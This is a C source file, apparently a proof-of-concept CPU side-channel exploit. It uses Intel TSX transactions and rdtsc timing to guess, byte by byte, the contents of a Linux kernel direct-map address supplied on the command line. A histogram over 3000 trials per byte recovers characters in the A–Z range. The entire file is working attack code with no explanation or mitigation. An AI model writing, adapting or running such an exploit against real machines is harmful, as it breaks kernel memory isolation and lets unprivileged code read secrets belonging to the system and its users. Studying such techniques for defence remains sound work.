#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <signal.h>
#include <setjmp.h>
#ifdef _MSC_VER
#include <intrin.h> /* for rdtscp and clflush */
#pragma optimize("gt", on)
#else
#include <x86intrin.h> /* for rdtscp and clflush */
#endif
// #include "cacheutils.h"

#define FROM 'A'
#define TO 'Z'

uint64_t start_time, spend_time;
static int hist[256];

static __attribute__((always_inline)) inline uint64_t rdtsc()
{
    uint64_t a, d;
    asm volatile("mfence");
    asm volatile("rdtsc"
                 : "=a"(a), "=d"(d));
    a = (d << 32) | a;
    asm volatile("mfence");
    return a;
}

static __attribute__((always_inline)) inline unsigned int xbegin(void)
{
    int ret = (~0u);
    asm volatile(".byte 0xc7,0xf8 ; .long 0"
                 : "+a"(ret)::"memory");
    return ret;
}

int main(int argc, char *argv[])
{
    unsigned char test_num, result_num;
    size_t secret, len = 10, try_times = 3000;
    uint64_t result_time;
    int i, size, max_i, max_i_index;

    secret = strtoull(argv[1], NULL, 0);
    secret += 0xffff888000000000;
    if (argc > 2)
    {
        len = atoi(argv[2]);
    }

    for (size = 0; size < len; size++)
    {
        for (i = 0; i < 256; i++)
            hist[i] = 0;

        for (i = 0; i < try_times; i++)
        {
            result_time = 0;
            for (test_num = 0; test_num <= TO; test_num++)
            {
                asm volatile(
                    ".rep 10 \n\t"
                    "mov $0, %%rax \n\t"
                    ".endr \n\t" ::
                        :);
                start_time = __rdtsc();

                __asm__ __volatile__(
                    "mov %[cmp_value], %%rcx \n\t"
                    "mov %[test_num], %%bl \n\t"
                    :
                    : [cmp_value] "r"(secret + size),
                      [test_num] "r"(test_num)
                    :);
                if (xbegin() == (~0u))
                {
                    __asm__ __volatile__(
                        "sub %%bl, (%%rcx)\n\t"
                        // ".rep 100 \n\t"
                        // "nop \n\t"
                        // ".endr \n\t"
                        :
                        :
                        :);
                }
                asm volatile(
                    // ".rep 6 \n\t"
                    // "nop \n\t"
                    // ".endr \n\t"
                    // "lahf \n\t"
                    // "mov %%ah, %%al \n\t"
                    // "mov %%al, %%bl \n\t"
                    // "sahf \n\t"
                    // ZF=1
                    "JNA equal \n\t"
                    "jmp notequal\n\t"
                    "equal: nop \n\t" ::
                        :);
                // printf("equal, %d:%c\n", test_num, test_num);
                asm volatile(
                    "notequal: nop \n\t");
                spend_time = __rdtsc() - start_time;

                if (result_time < spend_time)
                {
                    result_time = spend_time;
                    result_num = test_num;
                }
            }

            hist[result_num]++;
        }

        max_i = -1;
        for (i = 'A'; i < 'z'; i++)
        {
            if (max_i < hist[i])
            {
                max_i = hist[i];
                max_i_index = i;
            }
        }

        printf("size: %d, ", size);
        printf("\t max_i: %d, ", max_i);
        printf("\t max_i_index: %c\n", max_i_index);
    }
    printf("try_times: %ld\n", try_times);
    return 0;
}